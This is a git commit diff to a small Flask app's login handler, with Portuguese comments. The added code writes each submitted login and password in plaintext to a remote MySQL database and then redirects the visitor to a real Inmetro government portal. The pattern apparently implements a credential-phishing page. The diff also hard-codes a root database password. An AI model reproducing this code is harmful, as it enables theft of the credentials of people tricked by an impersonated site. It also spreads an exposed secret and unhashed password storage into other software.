b06c62cca88334db0969bea7495718e4893e2f9d
Juan Alves <juan.alves@mediacaonline.com>
2023-06-06 17:24:12 -0300

    teste req

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 from flask import Flask, render_template, request, redirect
+import mysql.connector
 
 app = Flask(__name__)
 
@@ -17,6 +18,31 @@ def login():
     if request.method == 'POST':
       login = request.form['login']
       senha = request.form['senha']
+
+      # Criar um objeto com os dados recebidos
+      dados = Dados(login, senha)
+
+      conn = mysql.connector.connect(
+        host='containers-us-west-189.railway.app',
+        database='railway', 
+        user='root',
+        password='5Rg4COCO8b9meUM2gTbE'
+      )
+                                          
+      # Criar um cursor para executar as operações no banco de dados
+      cursor = conn.cursor()
+
+      # Executar a inserção dos dados na tabela desejada
+      query = "INSERT INTO users_2 (login, senha) VALUES (%s, %s)"
+      values = (dados.login, dados.senha)
+      cursor.execute(query, values)
+
+      # Confirmar a transação
+      conn.commit()
+
+      # Fechar o cursor e a conexão com o banco de dados
+      cursor.close()
+      conn.close()
 
       # Redirecionar para um site após a inserção no banco de dados
       return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')
